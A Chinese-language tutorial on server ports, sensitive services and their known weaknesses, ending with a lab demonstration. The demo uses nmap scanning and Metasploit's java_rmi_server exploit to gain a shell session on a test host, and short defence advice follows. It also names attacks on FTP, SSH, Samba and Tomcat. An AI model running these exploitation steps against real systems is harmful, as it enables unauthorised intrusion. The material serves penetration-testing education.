## 服务器

服务器是计算机的一种，但是它的功能比我们平时使用的电脑，要强的多，主要功能是提供计算和应用服务，它的组成架构跟我们的电脑一样，都是由CPU、硬盘、内存等组成

## 服务器端口

“端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部端口，不可见。例如计算机中的80端口、21端口、23端口等。而物理端口是我们日常可以见的，比如插口就是一个端口。

概括的来说，服务器的端口，相当于营业厅的办事窗口。一个服务器下有多个端口，一个端口，对应一个服务器软件。例如，我们可以通过https://example.com:8080/，来访问example服务器的8080端口

## 端口的作用

当一台服务器开启了一个可访问的程序，这个时候就需要一个渠道，提供给外界访问，这个渠道就是端口，我们通过端口，给外界提供了一个与服务器沟通的渠道，当然一台服务器上，会运行多个程序，运行多个程序，意味着服务器，需要开启多个端口，因为每个程序提供的功能都不一样，所以，他们开启的端口，所提供的功能也不一样

端口除了提供给外界访问服务器的渠道，同时也可以用来区分一台服务器上不同的服务，因为IP地址与网络服务的关系是一对多的关系

因此，一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号，因此要对服务进行测试，首先要确定当前测试的机器是否开放对应的端口号

## 端口的分类

服务器端口总数2^16，65536个，端口可分为UDP端口和TCP端口，其中udp 255端口和tcp
255端口是不一样的，因为他们采取的传输协议不一样，两者完全不冲突

服务器端口，可以按照端口的性质或者服务方式来划分，如果是按照端口的性质来分，会分为三类：

1、公认端口：这些端口的端口号为0-1023，这些端口通常，都固定分配给某些固定的服务，例如：80对应着http服务，21对应着FTP服务。当我们在输入网址的时候，因为http公认是80端口，我们直接输入http://www.example.com即可，如果http改成了83，那我们就需要加上:83了，因为http服务公认是采取80端口的

2、注册端口：端口号从1024到49151，在这些范围内的端口，通常没有被明确的服务对象所定义，所以这些端口，可以用于多种不同的目的。例如，分配给用户进程和应用程序。

3、动态或私有端口：端口号从49152到65535，在这些范围内的端口号，经常被黑客所利用，来用做木马后门程序启动的端口号，因为在这些范围内的端口，一般固定不分配服务程序并且隐蔽，不容易被发现。

## 服务器敏感端口以及危害

端口| 服务| 说明  
---|---|---  
21| FTP（File Transfer Protocol）|
文件传输协议，用于在网络协议中，传输文件的一套标准协议，使用客户端/服务器模式，工作在应用层。在FTP没有禁止用户匿名登录的情况下，可以使用anonymous进行登入，当然在有些的FTP当中，默认存在后门，特别是vsftpd2.3.4版本中。因为其在数据传输过程中，使用的是明文传输，会被第三者嗅探，从而导致用户登录FTP服务器的账号密码，可能被窃取。  
22| SSH（Secure Shell）|
安全外壳协议，可以在不安全的网络环境中，提供安全的传输环境，它的出现是为了替代ftp、telnet。SSH的主要功能，是用来在远程终端上，进行命令的传输和执行。我们可以使用medusa破解ssh的弱口令，用metasploit登录ssh服务器，建立对应的bash
shell连接，通过获得的bash shell，注入metasploit中的Meterpreter
payload，从而获取更高的权限，当然，在进行这一系列的操作假想前，是我们的SSH服务器存在弱口令。  
23| Telnet|
telnet是Internet远程登录服务器的一种方式，它为用户提供了在本地计算机上，完成远程主机工作的能力。虽然它操作简单，但是在重视安全的环境下，并不被广泛使用，因为它的传输过程，采取的是明文传输，传输内容，极易暴露在互联网环境下。  
25| Smtp| 简单邮件传输协议，我们可以通过该协议，发送邮件  
110| pop3（Post Office Protocol - Version 3）| 邮局协议，用来从本地客户端接收邮件服务器上的邮件  
143| imap（Internet Message Access Protocol）| 因特网信息访问协议，用来从本地客户端访问邮件服务器上的邮件  
111、31| Rpcbind| rpcbind是NFS中用来进行消息通知的服务，我们可以通过Rpcbind找到nfs对应的端口号  
2049| NFS（Network File System）|
网络文件系统，它的功能是让我们本地的客户端，可以读写位于远端服务器上的文件。我们可以使用nmap判断nfs，是否可以导出，如果可以导出，我们可以在本地客户端直接导出  
139、445| Samba（Server Message Block）|
samba是在linux和unix系统上实现SMB（信息服务块）文件共享协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Message
Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。在metasploit中集成了利用samba
usermap RCE的脚本。我们可以通过对应的脚本，起到远程代码执行的效果  
1099| rmiregistry| Java RMI 指的是远程方法调用（Remote Method
Invocation）。能够让在某个java虚拟机上的对象调用另一个java虚拟机中的对象。我们可以使用Metasploit对rmi RCE漏洞进行利用。  
49152-65535| 后门程序|
当前程序之所以，存在后门程序，原因有三个：1、我们的服务器遭受过黑客攻击，使得它在原有的服务器上留了一个后门。2、系统管理员，在服务器上开了一个后门程序，但是忘记关闭了。3、某些软件，本身就存在连接shell的后门。这个时候，我们可以直接进行连接，连接到对应的shell  
3306| Mysql| mysql是一个关系型数据库管理系统，把数据存储到表当中，而不是将所有的数据，存储到大的仓库当中  
5432| Postgresql|
postgresql是关系数据库，支持大部分的sql标准，并且提供了许多的现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同时，还增加了许多的扩展，比如新的数据类型、函数、操作符、聚集函数、索引。  
5900| VNC（Virtual Network Console）|
虚拟网络控制台，它是一款远程控制桌面软件，有点类似远程桌面，但是不同点在与，远程桌面软件，开放的是3389端口，而虚拟网络控制台开放的是5900端口。  
6667| Irc（Internet Relay Chat）|
互联网中继聊天，是互联网聊天协议。我们只要在自己的客户端上启动软件，通过irc协议，连接到irc服务器上，就可以与自己，同一个频道上的用户聊天。我们可以通过msf查找可利用的poc，连接shell，从而执行任意的命令。  
8180| Tomcat|
Tomcat服务器是一个免费的开放源代码的WEB应用服务器，这里的服务器指的是中间键，类似于iis、apache，这些中间键的web容器，属于轻量级应用服务器。在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调式JSP程序的首选。我们可以在msf下，使用use
multi/http/tomcat_mgr_deploy模块利用tomcat upload功能反弹shell。  
  
## 如何发现服务器的IP地址

在互联网当中，我们可以使用多种方式去获取目标服务器的IP地址，在下面举几个，根据个人的习惯去使用

ping命令去ping目标的域名，得到域名对应的IP地址

    
    
    ping www.baidu.com
    

![image](https://image.3001.net/images/20220827/1661584987_6309c65b305fc38f4afc3.png!small)

nslookup查看下域名的IP是多少

    
    
    nslookup baidu.com
    

![image](https://image.3001.net/images/20220827/1661584999_6309c6672f2cbf437a3f7.png!small)

dig查看域名

    
    
    dig baidu.com
    

![image](https://image.3001.net/images/20220827/1661585012_6309c674686e5f0cd019f.png!small)

dig通过dns服务器，查看域名

    
    
    dig @114.114.114.114 baidu.com
    

![image](https://image.3001.net/images/20220827/1661585024_6309c680e7a6b15b895a5.png!small)

dig通过dns服务器，查询所有，any #显示所有类型的域名记录。默认只显示 A 记录

    
    
    dig @114.114.114.114 baidu.com any
    

![image](https://image.3001.net/images/20220827/1661585069_6309c6ad831bd2566f7e4.png!small)

使用FOFA查找域名的IP

    
    
    domain="baidu.com"
    

![image](https://image.3001.net/images/20220827/1661585053_6309c69db90349507c269.png!small)

对于内网的IP地址，我们可以使用kali linux自带的netdiscover对特定子网进行多主机扫描

    
    
    netdiscover -r 192.168.42.1/24
    

![image](https://image.3001.net/images/20220827/1661585037_6309c68de4486d31a1279.png!small)

## 探测服务器开放的端口

使用nmap来探测IP地址开放的端口

    
    
    nmap 192.168.42.138 -p 1-65535
    

![image](https://image.3001.net/images/20220827/1661585089_6309c6c1e22e3f32d4fc5.png!small)

使用goby来扫描IP地址开放的端口

## 实战演示

接下来，我们选择java rmi反序列化远程命令执行漏洞，来演示一下

我们先扫描一下，目标IP地址上，是否有rmi程序，在运行

    
    
    nmap 192.168.42.138 -p 1-65535
    

![image](https://image.3001.net/images/20220827/1661585102_6309c6cebfb96c5bc8bd5.png!small)

我们看到确实是开启了，我们接下来，探测一下目标rmi的版本信息

    
    
    nmap 192.168.42.138 -p 1099 --script banner
    

![image](https://image.3001.net/images/20220827/1661585114_6309c6dabaf566ee87229.png!small)

可以看到这里探测出对应的运行服务信息，但是版本信息没有出来，可能是服务器屏蔽了，没有显示出来

在实际情况下，肯定要使用漏洞扫描器，进行漏洞探测，但是在这里我们可以直接将POC进行利用

    
    
    msfconsole
    use exploit/multi/misc/java_rmi_server
    show options
    set rhosts 192.168.42.138
    exploit
    

![image](https://image.3001.net/images/20220827/1661585130_6309c6eaacdb813916613.png!small)

![image](https://image.3001.net/images/20220827/1661585142_6309c6f6a8fab595b92d8.png!small)

![image](https://image.3001.net/images/20220827/1661585153_6309c7018cf276d581857.png!small)

![image](https://image.3001.net/images/20220827/1661585164_6309c70c2d1c1bbe2cade.png!small)

    
    
    sessions -l
    

![image](https://image.3001.net/images/20220827/1661585175_6309c717dabe6ad655b72.png!small)

成功获得一个session

实际上就是在metasploit的模块中，将我们系统的命令进行序列化，传输到rmi，在传递的过程中，rmi将传递的内容，转换为系统的命令，整个过程是metasploit构造的一个特殊对象，在rmi
server当中进行了执行，我们这里连接下server进行一个对话

    
    
    sessions -i 1
    sysinfo
    ps
    

![image](https://image.3001.net/images/20220827/1661585187_6309c723396335cde4765.png!small)

## 防御修复

1、存在有缺陷的第三方库如commons-collections 时。要及时升级库，或者改用其它的库，来代替这个存在缺陷的第三方库

2、在进行权限设置时，要对java的rmi进程进行限制

